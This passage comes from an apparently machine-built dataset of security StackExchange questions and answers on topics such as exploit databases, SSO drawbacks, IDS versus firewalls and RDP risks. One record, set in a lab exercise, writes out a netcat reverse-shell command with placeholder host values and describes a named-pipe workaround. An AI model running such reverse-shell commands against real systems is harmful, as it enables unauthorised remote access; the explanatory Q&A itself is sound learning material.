      "question": "Exploit database for NVD vulnerabilities\nI have the list of vulnerabilities (CVEs) in the NVD database. I need to find which one has an exploit. Is there any database available to get the list of all the exploits for CVEs? or is there any API to get them?",
      "answer": "Few sources I search for exploits (by CVE):\n\nExploit Database \nCX Security\nVulnerability & Exploit Database\n0day.today (accessible via tor onion service)\nVulDB (not exactly for exploits, but helpful)\n\nDo check this list for additional sources of vulnerability databases"
    }
  },
  {
    "instruction": "How to determine if a browser is using an SSL or TLS connection?\nI want to know whether my browser is using SSL or TLS connection if I see HTTPS.\nI want to know for IE, Firefox, Chrome and Safari. I want to know the protocol version.",
    "context": "",
    "output": "From Google Chrome version 56 up \nOpen Chrome developer tools using F12 shortcut key and select Security tab that would provide the security info as shown below.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to determine if a browser is using an SSL or TLS connection?\nI want to know whether my browser is using SSL or TLS connection if I see HTTPS.\nI want to know for IE, Firefox, Chrome and Safari. I want to know the protocol version.",
      "answer": "From Google Chrome version 56 up \nOpen Chrome developer tools using F12 shortcut key and select Security tab that would provide the security info as shown below."
    }
  },
  {
    "instruction": "Please answer this question: Does having /sbin/nologin mean I cannot start the /bin/sh executable?\nWhile practicing exploitation on a lab, I managed to get the ability to execute php code which allowed me to execute system commands through shell_exec on a web server. The apache user has /sbin/nologin assigned as its shell.\nI have tried using the command nc -e /bin/sh [ip] [port] but it fails. Using netcat without starting a shell, however, succeeds. I assumed that this was because having the shell set to /no/login means I cannot start it. However, if I use an executable that performs execve(\"/bin/sh\") such as those found in msfvenom payload executables, it succeeds.\nAnother reason I assumed the nologin shell disallows a user to start an interactive shell is because trying the netcat reverse shell with a user who has /bin/sh configured as its shell succeeds. I am confused what phase checking for permissions to start a shell begins because I am still able to start it through binary executables.",
    "context": "",
    "output": "Most probably, your problem has nothing to do with the login shell. Having a version of nc that supports the -e option is a great exception. Most netcats don't support -e.\nThis article explains what you have to do in this case. You have to split the shell creation into 2 parts, first you create a pipe with\n\nmknod /tmp/mypipe p\n\nand then you create the shell by redirecting stdin and stdout to the pipe and thereby to nc.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does having /sbin/nologin mean I cannot start the /bin/sh executable?\nWhile practicing exploitation on a lab, I managed to get the ability to execute php code which allowed me to execute system commands through shell_exec on a web server. The apache user has /sbin/nologin assigned as its shell.\nI have tried using the command nc -e /bin/sh [ip] [port] but it fails. Using netcat without starting a shell, however, succeeds. I assumed that this was because having the shell set to /no/login means I cannot start it. However, if I use an executable that performs execve(\"/bin/sh\") such as those found in msfvenom payload executables, it succeeds.\nAnother reason I assumed the nologin shell disallows a user to start an interactive shell is because trying the netcat reverse shell with a user who has /bin/sh configured as its shell succeeds. I am confused what phase checking for permissions to start a shell begins because I am still able to start it through binary executables.",
      "answer": "Most probably, your problem has nothing to do with the login shell. Having a version of nc that supports the -e option is a great exception. Most netcats don't support -e.\nThis article explains what you have to do in this case. You have to split the shell creation into 2 parts, first you create a pipe with\n\nmknod /tmp/mypipe p\n\nand then you create the shell by redirecting stdin and stdout to the pipe and thereby to nc."
    }
  },
  {
    "instruction": "Hotel reservation. How is this secure with only credit card number and expiry date?\nUntil today I managed to avoid paying online with my credit card (I'm weird, I know...) but somehow I managed to do it.\nToday though I had to book a hotel room (on booking.com) that required a deposit. I entered the card issuer, card number and card expiration date.\nThe card issuer is basically redundant since from the number you can get the issuer. So basically, with two basic pieces of information (credit card number and expiry date) anyone can pull money from my account. \nIf someone has some spy glasses and looks at my credit card over my shoulder while I pay for some groceries they can then pay for stuff with my credit card.\nHow is this thing safe?",
    "context": "",
    "output": "Booking.com doesn't take a deposit or any payment from you; what you're filling in is a reservation form. The card details are used as a form of payment identity in case (a) you don't turn up and they need proof you intended to stay, or (b) you stay and run off without paying when checking out. They hotel still requires a present card for payment, or the CVV to do a card-not-present transaction, or cash if you choose to pay that way instead.\nThe bigger question of \"is this secure\" is more complicated. The simplest way to think about it is that there are a number of security controls in place to help prevent fraud, at various stages in the process (website, payment processor, bank), but even if these all fail the bank is insured against fraud, so you will get your money back if you use an appropriate card type. In general, credit cards offer superior and faster fraud protection in comparison to debit/bank cards.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Hotel reservation. How is this secure with only credit card number and expiry date?\nUntil today I managed to avoid paying online with my credit card (I'm weird, I know...) but somehow I managed to do it.\nToday though I had to book a hotel room (on booking.com) that required a deposit. I entered the card issuer, card number and card expiration date.\nThe card issuer is basically redundant since from the number you can get the issuer. So basically, with two basic pieces of information (credit card number and expiry date) anyone can pull money from my account. \nIf someone has some spy glasses and looks at my credit card over my shoulder while I pay for some groceries they can then pay for stuff with my credit card.\nHow is this thing safe?",
      "answer": "Booking.com doesn't take a deposit or any payment from you; what you're filling in is a reservation form. The card details are used as a form of payment identity in case (a) you don't turn up and they need proof you intended to stay, or (b) you stay and run off without paying when checking out. They hotel still requires a present card for payment, or the CVV to do a card-not-present transaction, or cash if you choose to pay that way instead.\nThe bigger question of \"is this secure\" is more complicated. The simplest way to think about it is that there are a number of security controls in place to help prevent fraud, at various stages in the process (website, payment processor, bank), but even if these all fail the bank is insured against fraud, so you will get your money back if you use an appropriate card type. In general, credit cards offer superior and faster fraud protection in comparison to debit/bank cards."
    }
  },
  {
    "instruction": "Answer the following question:\n\nWhat's the inverse of sandbox security pattern?\nI've been reading about the definition of the sandbox pattern and reading one answer given here. In the idea of a real world sandbox, it wasn't made only to prevent the children from leaving it, but also to prevent unwanted visitors from entering it.\nWhat is the name of the pattern for this second situation? Where the software runs in a controlled space to prevent outsiders from interfering.",
    "context": "",
    "output": "This \"preventing outsiders from interfering\" is achieved by sandboxing the outsiders, too. When everyone can't leave their sandbox, no one can enter their neighbour's sandbox. Ideally, the code that maintains the sandboxes is as lean as possible, to reduce the number of \"outsiders that can interfere\" as much as possible.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What's the inverse of sandbox security pattern?\nI've been reading about the definition of the sandbox pattern and reading one answer given here. In the idea of a real world sandbox, it wasn't made only to prevent the children from leaving it, but also to prevent unwanted visitors from entering it.\nWhat is the name of the pattern for this second situation? Where the software runs in a controlled space to prevent outsiders from interfering.",
      "answer": "This \"preventing outsiders from interfering\" is achieved by sandboxing the outsiders, too. When everyone can't leave their sandbox, no one can enter their neighbour's sandbox. Ideally, the code that maintains the sandboxes is as lean as possible, to reduce the number of \"outsiders that can interfere\" as much as possible."
    }
  },
  {
    "instruction": "What is the difference between active and passive Digital Footprints?\nI was learning about Digital footprints.\nWhat is the difference between active digital footprints and passive digital footprints?",
    "context": "",
    "output": "A simple Google search for digital footprint active passive has lead me to this article, which explains the difference:\n\n\nActive data traces is what a user leaves intentionally. Facebook, Twitter, blog posts, social network connections, image and video uploads all are among the ways individual\u2019s create active digital footprints for themselves.\n\n\n\n\nPassive data traces connected to an individual are left by others or gathered through activities that the user does without intent. Website visits and actions, searches and online purchases, online reviews and feedback are among the activities that add passive data traces to your digital footprint.\n\n\nSo in short, active data traces are things you intentionally leave behind. Passive data traces are things you don't intentionally leave behind.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What is the difference between active and passive Digital Footprints?\nI was learning about Digital footprints.\nWhat is the difference between active digital footprints and passive digital footprints?",
      "answer": "A simple Google search for digital footprint active passive has lead me to this article, which explains the difference:\n\n\nActive data traces is what a user leaves intentionally. Facebook, Twitter, blog posts, social network connections, image and video uploads all are among the ways individual\u2019s create active digital footprints for themselves.\n\n\n\n\nPassive data traces connected to an individual are left by others or gathered through activities that the user does without intent. Website visits and actions, searches and online purchases, online reviews and feedback are among the activities that add passive data traces to your digital footprint.\n\n\nSo in short, active data traces are things you intentionally leave behind. Passive data traces are things you don't intentionally leave behind."
    }
  },
  {
    "instruction": "Q: Why is 'Bearer' required before the token in 'Authorization' header in a HTTP request?\nWhat exactly is the difference between following two headers:\nAuthorization : Bearer cn389ncoiwuencr\n\n           vs\n\nAuthorization : cn389ncoiwuencr\n\nAll the sources which I have gone through, sets the value of 'Authorization' header as 'Bearer' followed by the actual token. However, I have not been able to understand the significance of it. What if I simply put the token in the Authorization header?",
    "context": "",
    "output": " A: Long before bearer authorization, this header was used for Basic authentication. For interoperability, the use of these headers is governed by W3C norms, so even if you're reading and writing the header, you should follow them. Bearer distinguishes the type of Authorization you're using, so it's important.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why is 'Bearer' required before the token in 'Authorization' header in a HTTP request?\nWhat exactly is the difference between following two headers:\nAuthorization : Bearer cn389ncoiwuencr\n\n           vs\n\nAuthorization : cn389ncoiwuencr\n\nAll the sources which I have gone through, sets the value of 'Authorization' header as 'Bearer' followed by the actual token. However, I have not been able to understand the significance of it. What if I simply put the token in the Authorization header?",
      "answer": "Long before bearer authorization, this header was used for Basic authentication. For interoperability, the use of these headers is governed by W3C norms, so even if you're reading and writing the header, you should follow them. Bearer distinguishes the type of Authorization you're using, so it's important."
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow anonymous is my setup?\nmy friend and I are trying to make the most anonymous setup for a computer to do things across the internet without being known the location from which it came.\nOur setup is as follows:\nA windows machine, with linux running in virtualbox, with a spoofed mac address using tor to do internet things. \nWill this setup provide anonymity on the internet? \nIs any of it redundant, or useless? \nWhat could we do better?",
    "context": "",
    "output": "Tor does not always protect your ip fully when you need to interact with the end node. You can check your efforts with online checks like this.\nWhat has worked for me on every check I've tried is JanusVM. It runs as a VM, which you use as a proxy for your hardened browser VM. Janus uses Tor, squid, dns-proxy-tor, and privoxy to cover your ip. It is very simple and easy to setup.\nI use VirtualBox's 'Seamless mode' so that my browser (in a guest VM) looks and acts like a local app on the host. Very convenient as long as you still remember which window is in the protected environment. :)",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How anonymous is my setup?\nmy friend and I are trying to make the most anonymous setup for a computer to do things across the internet without being known the location from which it came.\nOur setup is as follows:\nA windows machine, with linux running in virtualbox, with a spoofed mac address using tor to do internet things. \nWill this setup provide anonymity on the internet? \nIs any of it redundant, or useless? \nWhat could we do better?",
      "answer": "Tor does not always protect your ip fully when you need to interact with the end node. You can check your efforts with online checks like this.\nWhat has worked for me on every check I've tried is JanusVM. It runs as a VM, which you use as a proxy for your hardened browser VM. Janus uses Tor, squid, dns-proxy-tor, and privoxy to cover your ip. It is very simple and easy to setup.\nI use VirtualBox's 'Seamless mode' so that my browser (in a guest VM) looks and acts like a local app on the host. Very convenient as long as you still remember which window is in the protected environment. :)"
    }
  },
  {
    "instruction": "Answer this question:\n\nHow can I open id0, id1, nam, so, or til files?\nI am attempting to reverse engineer the DYMO Connect app in order to learn how to print to a DYMO LabelWriter Wireless printer. However, the mobile driver for the printer is in several different formats: id0, id1, nam, so, and til. Is there any way that I can open any one of these files so that I can see what code they wrote for the driver? I have searched about this question a lot, but the answers are not very helpful.",
    "context": "",
    "output": "A: id0, id1, nam and til files - are the temporary files which IDA creates when you load your binary into it. And after you close IDA, choosing to save the disassembly result, it's going to delete those files and save idb file instead. Idb - is a binary file where IDA stores disassembly information, so you need to open it with IDA in order to see what's inside. Since the only extension left is .so, I suppose that was the extension of the driver.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How can I open id0, id1, nam, so, or til files?\nI am attempting to reverse engineer the DYMO Connect app in order to learn how to print to a DYMO LabelWriter Wireless printer. However, the mobile driver for the printer is in several different formats: id0, id1, nam, so, and til. Is there any way that I can open any one of these files so that I can see what code they wrote for the driver? I have searched about this question a lot, but the answers are not very helpful.",
      "answer": "id0, id1, nam and til files - are the temporary files which IDA creates when you load your binary into it. And after you close IDA, choosing to save the disassembly result, it's going to delete those files and save idb file instead. Idb - is a binary file where IDA stores disassembly information, so you need to open it with IDA in order to see what's inside. Since the only extension left is .so, I suppose that was the extension of the driver."
    }
  },
  {
    "instruction": "Please answer this question: Difference between IDS and IPS and Firewall\nThe differences between an IDS and a firewall are that the latter prevents malicious traffic, whereas the IDS:\n\nPassive IDS: the IDS only reports that there was an intrusion.\nActive IDS: the IDS also takes actions against the issue to fix it or at least lessen its impact.\n\nHowever, what's the difference between an IPS and a Firewall? Both are a preventative technical control whose purpose is to guarantee that incoming network traffic is legitimate.",
    "context": "",
    "output": "The line is definitely blurring somewhat as technological capacity increases, platforms are integrated, and the threat landscape shifts. At their core we have\n\nFirewall - A device or application that analyzes packet headers and enforces policy based on protocol type, source address, destination address, source port, and/or destination port. Packets that do not match policy are rejected.\nIntrusion Detection System - A device or application that analyzes whole packets, both header and payload, looking for known events. When a known event is detected a log message is generated detailing the event.\nIntrusion Prevention System - A device or application that analyzes whole packets, both header and payload, looking for known events. When a known event is detected the packet is rejected.\n\nThe functional difference between an IDS and an IPS is a fairly subtle one and is often nothing more than a configuration setting change. For example, in a Juniper IDP module, changing from Detection to Prevention is as easy as changing a drop-down selection from LOG to LOG/DROP. At a technical level it can sometimes require redesign of your monitoring architecture.\nGiven the similarity between all three systems there has been some convergence over time. The Juniper IDP module mentioned above, for example, is effectively an add-on component to a firewall. From a network flow and administrative perspective the firewall and IDP are functionally indistinguishable even if they are technically two separate devices.\nThere is also much market discussion of something called a Next Generation Firewall (NGFW). The concept is still new enough that each vendor has their own definition as to what constitutes a NGFW but for the most part all agree that it is a device that enforces policy unilaterally across more than just network packet header information. This can make a single device act as both a traditional Firewall and IPS. Occasionally additional information is gathered, such as from which user the traffic originated, allowing even more comprehensive policy enforcement.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Difference between IDS and IPS and Firewall\nThe differences between an IDS and a firewall are that the latter prevents malicious traffic, whereas the IDS:\n\nPassive IDS: the IDS only reports that there was an intrusion.\nActive IDS: the IDS also takes actions against the issue to fix it or at least lessen its impact.\n\nHowever, what's the difference between an IPS and a Firewall? Both are a preventative technical control whose purpose is to guarantee that incoming network traffic is legitimate.",
      "answer": "The line is definitely blurring somewhat as technological capacity increases, platforms are integrated, and the threat landscape shifts. At their core we have\n\nFirewall - A device or application that analyzes packet headers and enforces policy based on protocol type, source address, destination address, source port, and/or destination port. Packets that do not match policy are rejected.\nIntrusion Detection System - A device or application that analyzes whole packets, both header and payload, looking for known events. When a known event is detected a log message is generated detailing the event.\nIntrusion Prevention System - A device or application that analyzes whole packets, both header and payload, looking for known events. When a known event is detected the packet is rejected.\n\nThe functional difference between an IDS and an IPS is a fairly subtle one and is often nothing more than a configuration setting change. For example, in a Juniper IDP module, changing from Detection to Prevention is as easy as changing a drop-down selection from LOG to LOG/DROP. At a technical level it can sometimes require redesign of your monitoring architecture.\nGiven the similarity between all three systems there has been some convergence over time. The Juniper IDP module mentioned above, for example, is effectively an add-on component to a firewall. From a network flow and administrative perspective the firewall and IDP are functionally indistinguishable even if they are technically two separate devices.\nThere is also much market discussion of something called a Next Generation Firewall (NGFW). The concept is still new enough that each vendor has their own definition as to what constitutes a NGFW but for the most part all agree that it is a device that enforces policy unilaterally across more than just network packet header information. This can make a single device act as both a traditional Firewall and IPS. Occasionally additional information is gathered, such as from which user the traffic originated, allowing even more comprehensive policy enforcement."
    }
  },
  {
    "instruction": "Question: Why forward a virtual machine with SSH to Putty\nI have watched a tutorial from Udemy where a guy is show how to crack wireless network. \nThe person in the video set up a virtual machine Oracle VM VirtualBox \nnetwork type NAT\nthen he forward the Port for the Virtual machine with settings:\nName:SSH\nProtocol:TCP\nHost Port:2222\nGuest Port:22\nFor Putty he have set for the Session:\nIP Adress: localhost \nPort: 2222\nAlso in Kali Linux he have updated rc.d\nupdate-rc.d ssh defaults\n\nservice ssh start\n\nthough he doesn't explains why to do this.\nI Googled a lots of why to do this and also I am interested to know the advantages.\nCould pleae someone clarify for me why you want to have this kind of setup?\ncause I found it hard to summarize why.\nThank you in advance\nRegards",
    "context": "",
    "output": "Answer: Based on your description, it doesn't sound like the setup has anything to do with Cracking Wireless. \nEverything you describe simply allows the user to SSH into the Guest machine from his Host. \nThere are numerous reasons why someone would set up this way though including: \n\nKeeping your attack machine off the network and showing all traffic coming from a legitimate host\nLimiting resource consumption in the VM perhaps by disabling the desktop and SSHing into it\n\nThe only benefit I can guess at to the situation you describe is that all traffic will seem to come from the Host machine rather than the Guest (Kali) machine and the user can SSH into the Guest directly. \nI wrote a quick blog post last month on how I use this exact setup to test environments over a VPN here. The reason I use this is because its the easiest way for my Guest machine to use my VPN connection.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why forward a virtual machine with SSH to Putty\nI have watched a tutorial from Udemy where a guy is show how to crack wireless network. \nThe person in the video set up a virtual machine Oracle VM VirtualBox \nnetwork type NAT\nthen he forward the Port for the Virtual machine with settings:\nName:SSH\nProtocol:TCP\nHost Port:2222\nGuest Port:22\nFor Putty he have set for the Session:\nIP Adress: localhost \nPort: 2222\nAlso in Kali Linux he have updated rc.d\nupdate-rc.d ssh defaults\n\nservice ssh start\n\nthough he doesn't explains why to do this.\nI Googled a lots of why to do this and also I am interested to know the advantages.\nCould pleae someone clarify for me why you want to have this kind of setup?\ncause I found it hard to summarize why.\nThank you in advance\nRegards",
      "answer": "Based on your description, it doesn't sound like the setup has anything to do with Cracking Wireless. \nEverything you describe simply allows the user to SSH into the Guest machine from his Host. \nThere are numerous reasons why someone would set up this way though including: \n\nKeeping your attack machine off the network and showing all traffic coming from a legitimate host\nLimiting resource consumption in the VM perhaps by disabling the desktop and SSHing into it\n\nThe only benefit I can guess at to the situation you describe is that all traffic will seem to come from the Host machine rather than the Guest (Kali) machine and the user can SSH into the Guest directly. \nI wrote a quick blog post last month on how I use this exact setup to test environments over a VPN here. The reason I use this is because its the easiest way for my Guest machine to use my VPN connection."
    }
  },
  {
    "instruction": "Can you tell me the answer to: What is the name of this concept involving hashes?\nI'm looking for the name of a concept that works as follows:\n\nI post a hash of a file publically e.g. on Twitter\nWhenever needed, I provide the file with the contents that make up the given hash\n\nThe purpose is maybe to proof ownership or otherwise proof that something was known to me in the past before it became public.\nKnowing the name will enable me reading more about it.",
    "context": "",
    "output": "answer: This makes me think about time-stamping service (see RFC3161).\n\nA time-stamping service supports assertions of proof that a datum existed before a particular time.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What is the name of this concept involving hashes?\nI'm looking for the name of a concept that works as follows:\n\nI post a hash of a file publically e.g. on Twitter\nWhenever needed, I provide the file with the contents that make up the given hash\n\nThe purpose is maybe to proof ownership or otherwise proof that something was known to me in the past before it became public.\nKnowing the name will enable me reading more about it.",
      "answer": "This makes me think about time-stamping service (see RFC3161).\n\nA time-stamping service supports assertions of proof that a datum existed before a particular time."
    }
  },
  {
    "instruction": "Answer the question below.\nHow does LBaaS / DBaaS or \"auto-scaling\" help protect from DoS?\nI ask this question as a follow up to this question in which I asked how I could protect from the simplest types of DoS attacks (say single-machine / up to 5 machines network level DoS attack) without using third party services like a CDN, given that it is unlikely for me to go thorugh a DDoS (although the answers to my question there shows that DDoS is likely just like a simple DoS is, in these days, due to various services that would help even a single attacker to launch a DDoS)\nMy hosting provider engineer told me that they are developing tools that could achieve my desire, at least in part, in the future, though these tools are now but experimental and far from being released in any form. The engineer mentioned the following three types of tools without explaining how each one of them could help reduce the risk to the phenomenon I just described:\n\nLBaas (I don't know what that means)\nDBaaS (Database as a Service)\n\"auto-scaling\" (I don't know what that means)\n\nAssuming I understood correctly, how could any of these tools help prevent any kind of network level DoS, if at all?",
    "context": "",
    "output": "LBaaS probably refers to Load Balancing as a Service (LBaaS).\nWith an LBaaS solution, the traffic to your site will reach to the LBaaS endpoint and then handed off to the server farm serving the site. In an auto-scaled environment, the number of servers(typically Virtual Machines) go up or down depending upon the traffic load.\nLBaaS solutions themselves integrate DDoS prevention mechanisms by monitoring packet states and other detection mechanisms. In combination with DBaaS and autoscaling, as the load goes up (in a DDoS scenario), the backend instances scale up as well to handle the additional load.\nThis of course does not assume that the Anything-as-a-service solutions can handle infinite load. That is, a service supported by the cloud cannot take DDoS attacks of the scale of Tbps (as have been recently demonstrated).",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does LBaaS / DBaaS or \"auto-scaling\" help protect from DoS?\nI ask this question as a follow up to this question in which I asked how I could protect from the simplest types of DoS attacks (say single-machine / up to 5 machines network level DoS attack) without using third party services like a CDN, given that it is unlikely for me to go thorugh a DDoS (although the answers to my question there shows that DDoS is likely just like a simple DoS is, in these days, due to various services that would help even a single attacker to launch a DDoS)\nMy hosting provider engineer told me that they are developing tools that could achieve my desire, at least in part, in the future, though these tools are now but experimental and far from being released in any form. The engineer mentioned the following three types of tools without explaining how each one of them could help reduce the risk to the phenomenon I just described:\n\nLBaas (I don't know what that means)\nDBaaS (Database as a Service)\n\"auto-scaling\" (I don't know what that means)\n\nAssuming I understood correctly, how could any of these tools help prevent any kind of network level DoS, if at all?",
      "answer": "LBaaS probably refers to Load Balancing as a Service (LBaaS).\nWith an LBaaS solution, the traffic to your site will reach to the LBaaS endpoint and then handed off to the server farm serving the site. In an auto-scaled environment, the number of servers(typically Virtual Machines) go up or down depending upon the traffic load.\nLBaaS solutions themselves integrate DDoS prevention mechanisms by monitoring packet states and other detection mechanisms. In combination with DBaaS and autoscaling, as the load goes up (in a DDoS scenario), the backend instances scale up as well to handle the additional load.\nThis of course does not assume that the Anything-as-a-service solutions can handle infinite load. That is, a service supported by the cloud cannot take DDoS attacks of the scale of Tbps (as have been recently demonstrated)."
    }
  },
  {
    "instruction": "What is the answer to this question - What are the disadvantages of single sign-on authentication?\nWe were discussing to implement single on in our web application,right now after analyzing we came to know that the following were the advantages of single sign on authentication. \nIn the words of Shwetha on the Cymfony System Testing blog:\n\nAdvantages\n\nUsers select stronger passwords, since the need for multiple passwords and change synchronization is avoided.\nInactivity timeout and attempt thresholds are applied uniformly closer to user points of entry.\nIt improves the effectiveness/timeliness of disabling all network/computer accounts for terminated users.\nIt improves an administrator's ability to manage users and user configurations to all associated systems.\nIt reduces administrative overhead in resetting forgotten passwords over multiple platforms and applications.\nIt provides users with the convenience of having to remember only a single set of credentials.\nThis also improves security as users find\n  it easier to remember their credentials and do not have to write them\n  down, allowing for a more efficient user logon process.\nIt reduces the time taken by users to log into multiple applications and platforms.\n\n\nWhat disadvantages exist when implementing single sign on technology?\n\n",
    "context": "",
    "output": "Single point of failure\nSingle high-value target (attracts more attackers)\nNecessary information disclosure between trusting site and SSO authority\nSide channel attack against authentication step (theoretically; implementation dependent)\nLack of control over your user list\nYet another interface to maintain (added complexity)\nYou may never know how secure your system is or if there is a breach\nAdded cost\n\nThese are all off the top of my head. I imagine someone has compiled a canonical list somewhere.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What are the disadvantages of single sign-on authentication?\nWe were discussing to implement single on in our web application,right now after analyzing we came to know that the following were the advantages of single sign on authentication. \nIn the words of Shwetha on the Cymfony System Testing blog:\n\nAdvantages\n\nUsers select stronger passwords, since the need for multiple passwords and change synchronization is avoided.\nInactivity timeout and attempt thresholds are applied uniformly closer to user points of entry.\nIt improves the effectiveness/timeliness of disabling all network/computer accounts for terminated users.\nIt improves an administrator's ability to manage users and user configurations to all associated systems.\nIt reduces administrative overhead in resetting forgotten passwords over multiple platforms and applications.\nIt provides users with the convenience of having to remember only a single set of credentials.\nThis also improves security as users find\n  it easier to remember their credentials and do not have to write them\n  down, allowing for a more efficient user logon process.\nIt reduces the time taken by users to log into multiple applications and platforms.\n\n\nWhat disadvantages exist when implementing single sign on technology?",
      "answer": "Single point of failure\nSingle high-value target (attracts more attackers)\nNecessary information disclosure between trusting site and SSO authority\nSide channel attack against authentication step (theoretically; implementation dependent)\nLack of control over your user list\nYet another interface to maintain (added complexity)\nYou may never know how secure your system is or if there is a breach\nAdded cost\n\nThese are all off the top of my head. I imagine someone has compiled a canonical list somewhere."
    }
  },
  {
    "instruction": "Q: What does a Remote Desktop Connection risk for both computers?\nI recently had a malware issue called \"mysearchdial\" that installed itself into my home computer's browser because someone didn't pay attention to what they were installing.\nI RDP'd into my work computer before this malware was completely removed, and I found that this malware had spread to my browsers at my work PC. Now, this could have been and probably was some sort of browser sync across computers, but it really raised the concern, what am I risking when I RDP to my work PC from my personal computer through a VPN? Is malware easily transferable through that connection?",
    "context": "",
    "output": " A: While \"RDP\"ing you have two very different and separates scenarios, it is very hard for a malware (crapware, virus, trojan...) to infect the RDP client (or server) machine, the only way is exploiting the RDP connection so it exploit the client through a malformed packet and manages to install in the new machine. \nI have never seen that and I believe exploiting that is complex enough for most malware not to try to research into that scenario (very poor ROI).\nAs you have pointed out the most probable cause is the automatic sync between browsers.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "What does a Remote Desktop Connection risk for both computers?\nI recently had a malware issue called \"mysearchdial\" that installed itself into my home computer's browser because someone didn't pay attention to what they were installing.\nI RDP'd into my work computer before this malware was completely removed, and I found that this malware had spread to my browsers at my work PC. Now, this could have been and probably was some sort of browser sync across computers, but it really raised the concern, what am I risking when I RDP to my work PC from my personal computer through a VPN? Is malware easily transferable through that connection?",
      "answer": "While \"RDP\"ing you have two very different and separates scenarios, it is very hard for a malware (crapware, virus, trojan...) to infect the RDP client (or server) machine, the only way is exploiting the RDP connection so it exploit the client through a malformed packet and manages to install in the new machine. \nI have never seen that and I believe exploiting that is complex enough for most malware not to try to research into that scenario (very poor ROI).\nAs you have pointed out the most probable cause is the automatic sync between browsers."
    }
  },
  {
    "instruction": "Answer this question:\n\nHow does an executable\u2019s static API differ from it\u2019s dynamic API?\nRunning an executable in Cuckoo sandbox gives me its dynamic API information. How do these API calls differ from their static API information (eg. If I were to just put the executable through IDA Pro or Ghidra?) I know that the static API calls have different names from the dynamic ones, but are they two separate non intersecting sets (i.e. each particular API name only belongs to either the static API category or the dynamic API category, and never both?)",
    "context": "",
    "output": "A: First of all, I want to clarify some of the concepts about \"API calls.\" I will explain these concepts, mainly thinking of WinAPI and PE files. I'm not claiming these definitions are correct for all systems.\nOperating system programming interfaces\nI assume you are referring to OS API libraries as API. OS API is consists of different interfaces that user-mode applications can use to access the operating system. Using OS API, user-mode applications can abstract system call interfaces with more portable ones. There are many other benefits of OS API libraries like diversifying basic system call operations with high-level operations and making system call interface independent from user mode application interface. Some known OS API implementations are WinAPI and Glibc.\nHow can obtain shared library (DLL files in Microsoft Windows systems) information from an executable file?\nMost of the time shared library information is given in the PE header. And static analysis tools extract that information from that. I'm sure disassemblers like IDA has advanced features and extensions for detecting dynamic library loading.\nHow can we get dynamically loaded library information?\nSome software like computer viruses and commercial products want to hide their operations from inspection to hide their activities or protect their intellectual property. They use dynamic loading to mask their OS and other API usages. They use LoadLibrary like API functions (and lots of different variations) for loading shared libraries. A sandbox or debugger can access this information hooking these functions. But, it is not sure that they can find all instances of dynamic loading.\nCan static and dynamic shared library information differ?\nI don't know how Cuckoo and IDA access shared library information, but static and dynamic analysis can show different shared libraries. Theoretically, some static analysis methods could find all dynamically loaded libraries. Which does not mean they mostly do.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How does an executable\u2019s static API differ from it\u2019s dynamic API?\nRunning an executable in Cuckoo sandbox gives me its dynamic API information. How do these API calls differ from their static API information (eg. If I were to just put the executable through IDA Pro or Ghidra?) I know that the static API calls have different names from the dynamic ones, but are they two separate non intersecting sets (i.e. each particular API name only belongs to either the static API category or the dynamic API category, and never both?)",
      "answer": "First of all, I want to clarify some of the concepts about \"API calls.\" I will explain these concepts, mainly thinking of WinAPI and PE files. I'm not claiming these definitions are correct for all systems.\nOperating system programming interfaces\nI assume you are referring to OS API libraries as API. OS API is consists of different interfaces that user-mode applications can use to access the operating system. Using OS API, user-mode applications can abstract system call interfaces with more portable ones. There are many other benefits of OS API libraries like diversifying basic system call operations with high-level operations and making system call interface independent from user mode application interface. Some known OS API implementations are WinAPI and Glibc.\nHow can obtain shared library (DLL files in Microsoft Windows systems) information from an executable file?\nMost of the time shared library information is given in the PE header. And static analysis tools extract that information from that. I'm sure disassemblers like IDA has advanced features and extensions for detecting dynamic library loading.\nHow can we get dynamically loaded library information?\nSome software like computer viruses and commercial products want to hide their operations from inspection to hide their activities or protect their intellectual property. They use dynamic loading to mask their OS and other API usages. They use LoadLibrary like API functions (and lots of different variations) for loading shared libraries. A sandbox or debugger can access this information hooking these functions. But, it is not sure that they can find all instances of dynamic loading.\nCan static and dynamic shared library information differ?\nI don't know how Cuckoo and IDA access shared library information, but static and dynamic analysis can show different shared libraries. Theoretically, some static analysis methods could find all dynamically loaded libraries. Which does not mean they mostly do."
    }
  },
  {
    "instruction": "Answer the question below.\nIs there a way to export all the strings for a certain module in x64dbg?\nI have an encrypted file that I was able to step through the code until that specific DLL file was decrypted in memory and I was able to list all of its strings. It has a ton of them that I would like to export all of them to a text file or even a CSV file if possible but I can't find any way to do so. \nAm I missing a command or a button somewhere or is this something I would need to try and write a script to accomplish?",
    "context": "",
